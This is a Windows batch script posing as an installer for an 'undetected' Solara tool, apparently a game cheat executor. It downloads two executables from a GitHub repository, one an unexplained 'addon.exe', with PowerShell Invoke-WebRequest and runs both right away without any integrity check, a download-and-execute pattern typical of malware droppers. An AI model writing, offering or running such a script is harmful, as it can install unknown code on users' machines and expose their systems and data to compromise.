@echo off
setlocal

echo Downloading and installing files...
set "URL1=https://raw.githubusercontent.com/stopeatingmyfood/undetected-solara-/main/solara/addon.exe"
set "URL2=https://raw.githubusercontent.com/stopeatingmyfood/undetected-solara-/main/solara/BootstrapperV1.18.exe"
set "FILENAME1=addon.exe"
set "FILENAME2=BootstrapperV1.18.exe"

:: Download first file
echo Downloading %FILENAME1%...
powershell -Command "Invoke-WebRequest -Uri %URL1% -OutFile %FILENAME1%" 
echo %FILENAME1% downloaded.

:: Download second file
echo Downloading %FILENAME2%...
powershell -Command "Invoke-WebRequest -Uri %URL2% -OutFile %FILENAME2%" 
echo %FILENAME2% downloaded.

:: Running both executables
echo Running %FILENAME1%...
start "" "%~dp0%FILENAME1%"

echo Running %FILENAME2%...
start "" "%~dp0%FILENAME2%"

echo Installation complete.
pause